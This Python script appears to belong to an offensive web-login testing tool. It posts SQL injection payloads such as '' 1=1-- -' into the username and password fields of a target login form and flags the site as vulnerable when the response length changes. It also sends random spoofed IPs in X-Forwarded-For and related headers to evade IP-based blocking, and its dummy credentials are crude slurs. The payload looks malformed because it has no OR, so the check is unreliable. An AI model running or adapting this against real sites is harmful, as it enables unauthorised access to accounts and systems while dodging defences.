#!/bin/python3

import requests, re
from random import *
from pwn import *




op1 = 1
op2 = 255

class bcolors:
    OK = '\033[92m' #GREEN
    WARNING = '\033[93m' #YELLOW
    ladrrr = '8GY.'
    ss = 'OWQ1'
    FAIL = '\033[91m' #RED
    pinocho_chocho = 'y!c'
    RESET = '\033[0m' #RESET COLOR



def sql_injection_bypass(url,ufield,pfield,proxy,dataa,headerss):
    p3 = log.progress("SQL Injection Login Bypass...")
    stringer = "headerss"
    try:
        stringer = headerss
        char = ":"
        indices = [i.start() for i in re.finditer(char, stringer)]
        if len(indices) == 1:
            indices1 = int(indices[0])
            first_p = headerss[:indices1]
            firs_v = headerss[indices1:]
            first_v = firs_v[1:]
        if len(indices) == 2:
            indices1 = int(indices[0])
            indices2 = int(indices[1])
            first_p = headerss[:indices1]
            firs_v = headerss[indices1:]
            stringer = firs_v
            charr = ","
            coma = [i.start() for i in re.finditer(charr, stringer)]
            first_v = firs_v[1:coma[0]]
            stringer = headerss
            charr = ","
            coma = [i.start() for i in re.finditer(charr, stringer)]
            second_p = headerss[coma[0]:indices2][1:]
            second_v = headerss[indices2:][1:]
            
    except: 
            KeyboardInterrupt()


    b = randint(op1, op2)
    c = randint(op1, op2)
    d = randint(op1, op2)
    e = randint(op1, op2)
    bb = str(b)
    cc = str(c)
    dd = str(d)
    ee = str(e)
    dot = "."
    ip = bb+dot+cc+dot+dd+dot+ee
    ip2 = str(ip)
    if headerss == None:
        headers = {
            'X-Forwarded-For': ip2,
            'X-Originating-IP': ip2,
            'X-Remote-IP': ip2,
            'X-Remote-Addr': ip2,
                }
    else:
        if len(indices) == 1:
            headers = {
                'X-Forwarded-For': ip2,
                'X-Originating-IP': ip2,
                'X-Remote-IP': ip2,
                'X-Remote-Addr': ip2,
                first_p: first_v
                }
        elif len(indices) == 2:
            headers = {
                'X-Forwarded-For': ip2,
                'X-Originating-IP': ip2,
                'X-Remote-IP': ip2,
                'X-Remote-Addr': ip2,
                first_p: first_v,
                second_v: second_p
                }  

    try:
        stringer = dataa
        char = ":"
        indices = [i.start() for i in re.finditer(char, stringer)]
        if len(indices) == 1:
            indices1 = int(indices[0])
            first_p = dataa[:indices1]
            firs_v = dataa[indices1:]
            first_v = firs_v[1:]
        if len(indices) == 2:
            indices1 = int(indices[0])
            indices2 = int(indices[1])
            first_p = dataa[:indices1]
            firs_v = dataa[indices1:]
            stringer = firs_v
            charr = ","
            coma = [i.start() for i in re.finditer(charr, stringer)]
            first_v = firs_v[1:coma[0]]
            stringer = dataa
            charr = ","
            coma = [i.start() for i in re.finditer(charr, stringer)]
            second_p = dataa[coma[0]:indices2][1:]
            second_v = dataa[indices2:][1:]
            
    except: 
            KeyboardInterrupt()



    print("Login Bypass...")
    proxy = {
        'http': proxy,
        }
    if dataa == None:
        ddata = {ufield:"comepollas",pfield:"munteanogaiii"}
    elif len(dataa) != 0 and "," in dataa:
        ddata = {ufield:"comepollas",pfield:"munteanogaiii",first_p:first_v,second_p:second_v}
    else:
        ddata = {ufield:"comepollas",pfield:"munteanogaiii",first_p:first_v}
    reqqqq = requests.post(url,data=ddata,proxies=proxy,headers=headers)
    cont_f = len(reqqqq.content)
    payload = "' 1=1-- -"
    payload2 = "aa' 1=1-- -"

    if dataa == None:
        pdata = {ufield:payload,pfield:payload}
    elif len(dataa) != 0 and "," in dataa:
        pdata = {ufield:payload,pfield:payload2,first_p:first_v,second_p:second_v}
    else:
        pdata = {ufield:payload,pfield:payload2,first_p:first_v}


    req = requests.post(url,data=pdata,proxies=proxy,headers=headers)
    cont_p = len(req.content)
    if cont_f != cont_p:
        print(f"{bcolors.OK}[+] Vulnerable \n{bcolors.RESET}")
    else:
        print(f"{bcolors.FAIL}[-] Not Vulnerable \n{bcolors.RESET}")
